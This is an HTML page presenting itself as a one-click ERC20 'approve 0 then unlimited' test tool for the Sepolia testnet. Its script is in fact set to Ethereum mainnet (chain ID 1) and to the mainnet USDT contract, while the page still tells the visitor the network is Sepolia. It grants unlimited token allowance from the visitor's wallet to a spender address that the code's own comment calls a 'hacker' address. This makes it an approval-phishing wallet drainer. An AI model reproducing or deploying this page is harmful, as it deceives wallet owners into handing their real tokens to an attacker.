<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8" />
  <title>ERC20 一键二次授权（先置0→MaxUint）</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <!-- ethers.js v6 -->
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.2/dist/ethers.min.js"></script>
  <style>
    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; padding: 16px; background:#f8f9fb; }
    .card { max-width: 680px; margin: 0 auto; padding: 16px; border: 1px solid #eee; border-radius: 12px; background: #fff; box-shadow: 0 4px 18px rgba(0,0,0,.06); }
    button { padding: 12px 16px; border-radius: 10px; border: none; cursor: pointer; font-size: 16px; }
    .primary{ background:#3b82f6; color:white }
    code { background:#f6f8fa; padding:2px 6px; border-radius:6px; word-break: break-all; }
    pre{background:#0b1020;color:#c7d2fe;padding:12px;border-radius:10px;overflow:auto}
  </style>
</head>
<body>
  <div class="card">
    <h2>ERC20 一键二次授权（approve 0 → MaxUint）</h2>
    <p><b>仅用于测试，推荐在 Sepolia 测试网使用！</b></p>
    <ul>
      <li>代币合约地址：<code id="token"></code></li>
      <li>被授权地址 (spender)：<code id="spender"></code></li>
      <li>网络：<code id="network"></code></li>
    </ul>
    <button class="primary" id="btn">执行二次授权</button>
    <pre id="log">日志：</pre>
  </div>

<script>
(async () => {
  // ======== 配置部分（请按需修改） ========
  const CHAIN_ID = 1; // Sepolia 测试网
  const TOKEN_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // 替换成你的 ERC20 测试代币地址
  const SPENDER        = "0x4287869bdaD2Be58b64dcc03F065fB70C4fAFCF2";    // 替换成测试“黑客”地址
  // ========================================

  // 显示配置
  document.getElementById('token').textContent   = TOKEN_CONTRACT;
  document.getElementById('spender').textContent = SPENDER;
  document.getElementById('network').textContent = `Sepolia (${CHAIN_ID})`;

  const ERC20_ABI = [
    "function approve(address spender, uint256 value) external returns (bool)",
    "function allowance(address owner, address spender) external view returns (uint256)"
  ];

  const logEl = document.getElementById('log');
  const log = (m)=>{ const now=new Date().toLocaleTimeString(); logEl.textContent+=`\n[${now}] ${m}`; logEl.scrollTop=logEl.scrollHeight; }

  function hasProvider(){ return typeof window.ethereum !== 'undefined'; }

  async function connect(){
    if(!hasProvider()){ log("❌ 未检测到钱包，请在 MetaMask / imToken (以太坊模块) DApp 浏览器中打开"); return null; }
    const provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const net = await provider.getNetwork();
    if(Number(net.chainId)!==CHAIN_ID){
      try{
        await window.ethereum.request({
          method:"wallet_switchEthereumChain",
          params:[{ chainId:"0x"+CHAIN_ID.toString(16) }]
        });
      }catch(e){ log("❌ 请手动切换到 Sepolia 网络"); return null; }
    }
    return provider;
  }

  async function approveZeroThenMax(){
    try{
      const provider = await connect(); if(!provider) return;
      const signer = await provider.getSigner();
      const erc20 = new ethers.Contract(TOKEN_CONTRACT, ERC20_ABI, signer);

      // Step 1: approve(spender, 0)
      log("⏳ Step1: approve(spender, 0)...");
      let tx = await erc20.approve(SPENDER, 0n);
      log(`提交交易：${tx.hash}`);
      await tx.wait();
      log("✅ Step1 完成");

      // Step 2: approve(spender, MaxUint)
      log("⏳ Step2: approve(spender, MaxUint256)...");
      tx = await erc20.approve(SPENDER, ethers.MaxUint256);
      log(`提交交易：${tx.hash}`);
      await tx.wait();
      log("✅ Step2 完成 — 已无限授权");

      // 验证 allowance
      const owner = await signer.getAddress();
      const allowance = await erc20.allowance(owner, SPENDER);
      log(`🔎 当前 allowance = ${allowance.toString()}`);
    }catch(e){
      log("❌ 出错："+(e?.reason || e?.message || e));
    }
  }

  document.getElementById('btn').onclick = approveZeroThenMax;
})();
</script>
</body>
</html>
